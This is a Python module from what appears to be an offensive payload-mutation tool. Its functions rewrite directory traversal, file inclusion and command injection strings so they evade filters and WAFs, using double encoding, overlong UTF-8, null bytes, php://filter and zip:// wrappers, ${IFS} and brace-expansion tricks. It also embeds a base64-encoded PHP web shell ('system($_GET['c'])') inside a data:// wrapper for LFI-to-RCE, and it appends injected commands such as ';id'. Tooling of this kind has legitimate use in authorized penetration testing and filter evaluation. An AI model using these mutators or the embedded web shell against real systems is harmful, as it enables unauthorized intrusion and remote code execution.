"""Directory Traversal, File Inclusion, and Command Injection mutators.

Traversal/inclusion mutators rewrite '../' sequences and wrapper schemes that
most filesystem/stream APIs still resolve. Command-injection mutators swap
shell metacharacters/separators for less-commonly-filtered equivalents.
"""
from __future__ import annotations

import re

from .base import REGISTRY

_TRAV = {"Directory Traversal", "File Inclusion"}
_FILE = {"File Inclusion"}
_CMD = {"Command Injection"}


# ---------------------------------------------------------------------------
# Directory Traversal / File Inclusion
# ---------------------------------------------------------------------------

def traversal_dot_percent(s: str) -> str:
    """'.' -> '%2e' in traversal sequences."""
    return s.replace("..", "%2e%2e")


def traversal_dot_double_percent(s: str) -> str:
    """'.' -> '%252e' (double URL-encoded dot, defeats single-decode normalizers)."""
    return s.replace("..", "%252e%252e")


def traversal_slash_percent(s: str) -> str:
    """'/' -> '%2f'."""
    return s.replace("/", "%2f")


def traversal_slash_double_percent(s: str) -> str:
    """'/' -> '%252f' (double-encoded)."""
    return s.replace("/", "%252f")


def traversal_overlong_utf8(s: str) -> str:
    """'../' -> overlong UTF-8 %c0%ae%c0%ae%c0%af sequence (legacy IIS/Apache bug)."""
    return s.replace("../", "%c0%ae%c0%ae%c0%af")


def traversal_dotdot_slashslash(s: str) -> str:
    """'../' -> '....//' (strips to '../' if a filter removes one '../' naively)."""
    return s.replace("../", "....//")


def traversal_dotdot_backslash(s: str) -> str:
    """'../' -> '..\\' (Windows-style separator, same semantic traversal)."""
    return s.replace("../", "..\\")


def traversal_nested_encoded_slash(s: str) -> str:
    """'../' -> '..%c0%af' (overlong-encoded slash only)."""
    return s.replace("../", "..%c0%af")


def traversal_mixed_slashes(s: str) -> str:
    """Alternate '/' and '\\' every other traversal segment."""
    parts = s.split("/")
    out = []
    for i, p in enumerate(parts):
        out.append(p)
        if i < len(parts) - 1:
            out.append("\\" if i % 2 else "/")
    return "".join(out)


def traversal_extra_slashes(s: str) -> str:
    """Duplicate slashes: '../' -> '..//'."""
    return s.replace("../", "..//")


def traversal_null_byte_suffix(s: str) -> str:
    """Append a legacy null-byte suffix to truncate appended extensions."""
    return s + "%00"


def traversal_null_byte_dot(s: str) -> str:
    """Append '%00.png' to bypass naive image-extension allow-lists."""
    return s + "%00.png"


def traversal_question_suffix(s: str) -> str:
    """Append '?' so some servers stop appending extensions after this point."""
    return s + "?"


def traversal_hash_suffix(s: str) -> str:
    """Append '#' fragment terminator for the same reason."""
    return s + "#"


def traversal_absolute_prefix(s: str) -> str:
    """Prefix with a redundant absolute-path marker '/' (collapses to same path)."""
    return "/" + s if not s.startswith("/") else s


def traversal_unc_prefix(s: str) -> str:
    """Prefix with a UNC-style double backslash for Windows targets."""
    return "\\\\" + s.replace("/", "\\")


def file_wrapper_php_filter(s: str) -> str:
    """Wrap target path in a php://filter base64 read chain (LFI -> source disclosure)."""
    target = s.lstrip("./")
    return f"php://filter/convert.base64-encode/resource={target}"


def file_wrapper_data(s: str) -> str:
    """Rebuild as a data:// wrapper carrying an inline PHP payload (LFI -> RCE)."""
    return "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOz8+"  # <?php system($_GET['c']);?>


def file_wrapper_file_scheme(s: str) -> str:
    """Prefix with explicit file:// scheme (still resolves to local path)."""
    target = s if s.startswith("/") else "/" + s
    return "file://" + target


def file_wrapper_zip(s: str) -> str:
    """Wrap in zip:// wrapper pattern used for phar/zip-based LFI->RCE chains."""
    target = s.lstrip("./")
    return f"zip://{target}%23payload"


def _register() -> None:
    R = REGISTRY
    R.add("trav_dot_percent", traversal_dot_percent, "encoder",
          "'..' -> '%2e%2e'", classes=_TRAV)
    R.add("trav_dot_double_percent", traversal_dot_double_percent, "encoder",
          "'..' -> double-encoded '%252e%252e'", classes=_TRAV)
    R.add("trav_slash_percent", traversal_slash_percent, "encoder",
          "'/' -> '%2f'", classes=_TRAV)
    R.add("trav_slash_double_percent", traversal_slash_double_percent, "encoder",
          "'/' -> double-encoded '%252f'", classes=_TRAV)
    R.add("trav_overlong_utf8", traversal_overlong_utf8, "encoder",
          "'../' -> overlong UTF-8 sequence", classes=_TRAV)
    R.add("trav_dotdot_slashslash", traversal_dotdot_slashslash, "obfuscator",
          "'../' -> '....//'", classes=_TRAV)
    R.add("trav_dotdot_backslash", traversal_dotdot_backslash, "obfuscator",
          "'../' -> '..\\\\' Windows separator", classes=_TRAV)
    R.add("trav_nested_encoded_slash", traversal_nested_encoded_slash, "encoder",
          "'../' -> '..' + overlong-encoded slash", classes=_TRAV)
    R.add("trav_mixed_slashes", traversal_mixed_slashes, "obfuscator",
          "alternate '/' and '\\\\' between segments", classes=_TRAV)
    R.add("trav_extra_slashes", traversal_extra_slashes, "obfuscator",
          "'../' -> '..//' duplicated slash", classes=_TRAV)
    R.add("trav_null_byte_suffix", traversal_null_byte_suffix, "obfuscator",
          "append raw %00 suffix", classes=_TRAV)
    R.add("trav_null_byte_dot_png", traversal_null_byte_dot, "obfuscator",
          "append '%00.png' to dodge extension allow-lists", classes=_TRAV)
    R.add("trav_question_suffix", traversal_question_suffix, "obfuscator",
          "append '?' terminator", classes=_TRAV)
    R.add("trav_hash_suffix", traversal_hash_suffix, "obfuscator",
          "append '#' fragment terminator", classes=_TRAV)
    R.add("trav_absolute_prefix", traversal_absolute_prefix, "obfuscator",
          "prefix with leading '/'", classes=_TRAV)
    R.add("trav_unc_prefix", traversal_unc_prefix, "obfuscator",
          "prefix with UNC '\\\\\\\\' and backslash segments", classes={"Directory Traversal"})
    R.add("file_wrapper_php_filter", file_wrapper_php_filter, "obfuscator",
          "wrap path in php://filter base64 read chain", classes=_FILE)
    R.add("file_wrapper_data", file_wrapper_data, "obfuscator",
          "rebuild as data:// wrapper with inline PHP payload", classes=_FILE)
    R.add("file_wrapper_file_scheme", file_wrapper_file_scheme, "obfuscator",
          "prefix target with file:// scheme", classes=_FILE)
    R.add("file_wrapper_zip", file_wrapper_zip, "obfuscator",
          "wrap path in zip:// wrapper pattern", classes=_FILE)

    # -----------------------------------------------------------------
    # Command Injection
    # -----------------------------------------------------------------
    R.add("cmd_sep_semicolon", cmd_sep_semicolon, "obfuscator",
          "separator -> ';'", classes=_CMD)
    R.add("cmd_sep_pipe", cmd_sep_pipe, "obfuscator",
          "separator -> '|'", classes=_CMD)
    R.add("cmd_sep_double_pipe", cmd_sep_double_pipe, "obfuscator",
          "separator -> '||' (runs on prior failure)", classes=_CMD)
    R.add("cmd_sep_double_amp", cmd_sep_double_amp, "obfuscator",
          "separator -> '&&' (runs on prior success)", classes=_CMD)
    R.add("cmd_sep_newline", cmd_sep_newline, "encoder",
          "separator -> URL-encoded newline %0a", classes=_CMD)
    R.add("cmd_subshell_dollar_paren", cmd_subshell_dollar_paren, "obfuscator",
          "wrap trailing command in $(...) subshell", classes=_CMD)
    R.add("cmd_subshell_backtick", cmd_subshell_backtick, "obfuscator",
          "wrap trailing command in backtick subshell", classes=_CMD)
    R.add("cmd_ifs_space", cmd_ifs_space, "obfuscator",
          "spaces -> ${IFS} (bypasses space-filtering WAFs)", classes=_CMD)
    R.add("cmd_ifs_dollar_brace", cmd_ifs_dollar_brace, "obfuscator",
          "spaces -> ${IFS}$9 (alt IFS form)", classes=_CMD)
    R.add("cmd_brace_expansion", cmd_brace_expansion, "obfuscator",
          "rewrite 'cat' as brace-expansion {c,a,t}", classes=_CMD)
    R.add("cmd_quote_split_chars", cmd_quote_split_chars, "obfuscator",
          "insert empty quotes between every char of a command word",
          classes=_CMD)
    R.add("cmd_env_var_concat", cmd_env_var_concat, "obfuscator",
          "split command word and recombine with empty-string concat",
          classes=_CMD)
    R.add("cmd_sep_percent0a", cmd_sep_percent0a_raw, "encoder",
          "insert raw %0a byte between command tokens", classes=_CMD)


def cmd_sep_semicolon(s: str) -> str:
    return re.sub(r"\s*;\s*|\s*\|\|\s*|\s*&&\s*", ";", s) if re.search(r";|\|\||&&", s) else s + ";id"


def cmd_sep_pipe(s: str) -> str:
    return re.sub(r"\s*;\s*", "|", s) if ";" in s else s + "|id"


def cmd_sep_double_pipe(s: str) -> str:
    return re.sub(r"\s*;\s*", " || ", s) if ";" in s else s + " || id"


def cmd_sep_double_amp(s: str) -> str:
    return re.sub(r"\s*;\s*", " && ", s) if ";" in s else s + " && id"


def cmd_sep_newline(s: str) -> str:
    return re.sub(r"\s*;\s*", "%0a", s) if ";" in s else s + "%0aid"


def cmd_subshell_dollar_paren(s: str) -> str:
    m = re.search(r";\s*(.+)$", s)
    if m:
        return s[: m.start()] + f";$({m.group(1)})"
    return s + ";$(id)"


def cmd_subshell_backtick(s: str) -> str:
    m = re.search(r";\s*(.+)$", s)
    if m:
        return s[: m.start()] + f";`{m.group(1)}`"
    return s + ";`id`"


def cmd_ifs_space(s: str) -> str:
    return s.replace(" ", "${IFS}")


def cmd_ifs_dollar_brace(s: str) -> str:
    return s.replace(" ", "${IFS}$9")


def cmd_brace_expansion(s: str) -> str:
    return re.sub(r"\bcat\b", "{c,a,t}", s)


def cmd_quote_split_chars(s: str) -> str:
    def repl(m: re.Match) -> str:
        word = m.group(0)
        return "".join(f"{c}''" for c in word[:-1]) + word[-1]
    return re.sub(r"\bcat\b", repl, s)


def cmd_env_var_concat(s: str) -> str:
    def repl(m: re.Match) -> str:
        word = m.group(0)
        if len(word) < 2:
            return word
        mid = len(word) // 2
        return f"$(printf '%s%s' {word[:mid]} {word[mid:]})"
    return re.sub(r"\bcat\b", repl, s)


def cmd_sep_percent0a_raw(s: str) -> str:
    return re.sub(r"\s*;\s*", "\n", s) if ";" in s else s + "\nid"


_register()
